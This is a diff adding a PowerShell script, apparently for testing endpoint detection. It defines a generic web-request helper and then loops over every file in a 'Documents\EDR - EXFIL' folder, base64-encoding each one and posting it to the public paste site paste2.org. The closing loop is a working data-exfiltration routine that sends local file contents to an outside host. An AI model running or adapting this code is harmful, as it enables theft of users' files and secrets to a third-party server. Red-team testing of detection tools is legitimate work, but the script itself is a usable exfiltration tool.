@@ -1,0 +1,117 @@
+Function New-WebRequest
+{
+    [cmdletbinding()]
+
+    Param(
+    [parameter(Mandatory = $true)]$URI,
+    [parameter()]$Method = 'GET',
+    [parameter()]$Body,
+    [parameter()]$UserAgent,
+    [parameter()]$ContentType,
+    [parameter()]$ReadStream)
+    
+    Process
+    {        
+        $request = [System.Net.WebRequest]::Create($URI)
+        $request.Method = $Method
+
+        If ($Method -eq 'GET')
+        {
+
+        $response = $request.GetResponse()
+
+$request_str = @"
+$($request.Method) $($request.RequestUri.AbsolutePath) HTTP/$($request.ProtocolVersion)
+Host       : $($request.RequestUri.Host) 
+RequestURI : $($request.RequestUri.AbsoluteUri)
+Date       : $($response.Headers.Get('Date'))
+"@
+                    
+$response_str = @"
+HTTP/$($response.ProtocolVersion) $($response.StatusCode.value__) $($response.StatusDescription)
+ResponseURI : $($response.responseUri)
+Date        : $($response.Headers.Get('Date'))
+"@
+            $obj = New-Object PSObject -Property ([ordered]@{'Request'= $request_str; 'Response' = $response_str})
+            $obj
+            
+            $stream = New-Object System.IO.StreamReader $response.GetResponseStream()
+            
+            If ($ReadStream)
+            {
+                $stream.ReadToEnd()
+            }
+
+            $stream.Close()
+        }
+
+        If ($Method -eq 'POST')
+        {
+            $request.ContentType = $ContentType
+
+            $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
+
+            $streamwriter = New-Object System.IO.StreamWriter $request.GetRequestStream()           
+
+            $streamwriter.write($Bytes, 0, $Bytes.length)
+
+            $streamwriter.Close()
+
+            $response = $request.GetResponse()
+
+            $streamreader = New-Object System.IO.StreamReader $response.GetResponseStream()
+            
+            If ($ReadStream)
+            {
+                $streamreader.ReadToEnd()
+            }
+
+            $streamreader.close()
+
+$request_str = @"
+$($request.Method) $($request.RequestUri.AbsolutePath) HTTP/$($request.ProtocolVersion)
+Host: $($request.RequestUri.Host)
+RequestURI: $($request.RequestUri.AbsoluteUri)
+"@
+                    
+$response_str = @"
+HTTP/$($response.ProtocolVersion) $($response.StatusCode.value__) $($response.StatusDescription)
+ResponseURI : $($response.responseUri)
+Date: $($response.Headers.Get('Date'))
+"@
+            $obj = New-Object PSObject -Property ([ordered]@{'Request'= $request_str; 'Response' = $response_str})
+            $obj
+
+            
+        }
+
+    }
+
+}
+
+$dir = $env:SystemDrive + $env:HOMEPATH + '\Documents\EDR - EXFIL'
+$files = gci $dir
+$output = $dir + '\output.txt'
+
+ForEach ($file in $files)
+{
+    $file = $file.FullName
+
+    Try
+    {
+        $bytes = [System.IO.File]::ReadAllBytes($file)
+        $base64string = [System.Convert]::ToBase64String($bytes)
+
+        $base64string = $base64string.Replace('+', '%2B')
+
+        $request = New-WebRequest -URI 'https://paste2.org' -Method Post -ContentType 'application/x-www-form-urlencoded' -Body "code=$base64string&lang=text&description=&parent=" -OutVariable response | FL
+            
+        $file >> $output
+        $request >> $output
+
+    }
+    Catch
+    {
+        echo "'$File' - Something went wrong! `n$_" >> $output
+    }
+}
